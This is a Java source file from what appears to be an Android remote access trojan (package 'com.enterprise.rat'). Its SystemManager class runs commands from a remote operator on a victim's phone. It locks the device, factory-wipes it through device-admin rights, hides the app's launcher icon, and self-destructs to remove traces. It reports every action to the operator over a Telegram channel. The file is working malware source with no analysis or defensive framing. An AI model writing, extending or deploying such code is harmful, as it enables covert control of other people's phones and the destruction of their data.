package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.os.Build;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.widget.Toast;
import com.enterprise.rat.utils.TelegramApi;
import java.io.File;

public class SystemManager {
    public static void showToast(Context context, String text) {
        Toast.makeText(context, text, Toast.LENGTH_LONG).show();
        TelegramApi.sendMessage("💬 Toast shown");
    }

    public static void vibrate(Context context, int ms) {
        Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
        else v.vibrate(ms);
        TelegramApi.sendMessage("📳 Vibrated " + ms + "ms");
    }

    public static void playSound(Context context) {
        AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        am.playSoundEffect(AudioManager.FX_KEY_CLICK);
        TelegramApi.sendMessage("🔊 Sound played");
    }

    public static void lockDevice(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(context, "com.enterprise.rat.admin.DeviceAdminReceiver");
        if (dpm.isAdminActive(admin)) { dpm.lockNow(); TelegramApi.sendMessage("🔒 Locked"); }
        else TelegramApi.sendMessage("❌ Device Admin inactive");
    }

    public static void wipeDevice(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(context, "com.enterprise.rat.admin.DeviceAdminReceiver");
        if (dpm.isAdminActive(admin)) { dpm.wipeData(0); TelegramApi.sendMessage("🗑 Wiping..."); }
        else TelegramApi.sendMessage("❌ Device Admin inactive");
    }

    public static void selfDestruct(Context context) {
        TelegramApi.sendMessage("💀 Self-destruct initiated...");
        new Thread(() -> {
            try {
                File appDir = context.getFilesDir().getParentFile();
                deleteRecursive(appDir);
                android.os.Process.killProcess(android.os.Process.myPid());
            } catch (Exception e) {}
        }).start();
    }

    public static void hideIcon(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName component = new ComponentName(context, com.enterprise.rat.MainActivity.class);
        pm.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        TelegramApi.sendMessage("👻 Icon hidden");
    }

    public static void enableAutostart(Context context) {
        TelegramApi.sendMessage("✅ Auto-start enabled via BootReceiver");
    }

    private static void deleteRecursive(File file) {
        if (file.isDirectory()) { File[] children = file.listFiles(); if (children != null) for (File child : children) deleteRecursive(child); }
        file.delete();
    }
}
